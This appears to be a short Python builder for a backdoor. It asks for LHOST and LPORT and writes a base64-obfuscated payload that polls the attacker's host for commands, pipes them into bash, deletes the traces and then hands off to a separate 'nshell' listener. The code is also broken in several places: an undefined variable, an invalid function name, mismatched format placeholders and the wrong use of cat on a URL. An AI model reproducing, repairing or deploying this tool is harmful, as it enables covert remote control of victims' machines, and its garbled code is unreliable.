import os, time
import base64

os.chdir("../output/")
time.sleep(0.5)
opt = input("LHOST: ")
opt2 = input("LPORT: ")
opt3 = input("name: ")
op = open(name + ".py", "w")
cod = """import os, time
os.system("python3 -m http.server 8080 &")
def get-put(ip):
	os.system("cat http://{}:{}/data.txt >> data.sh".format(ip))
	time.sleep(0.5)
	os.system("bash data.sh > data")
	os.remove("data.sh")
	time.sleep(1.5)
	os.remove("data")
	os.system("clear")
while True:
	get(ip)""".format(opt, opt2)
cod1 = base64.b64encode(cod)
op1 = op.write("""
import os
import base64
import time

exec(base64.b64decode(cod))""")
os.chdir("../nshell/")
os.system("python3 nshell.py")
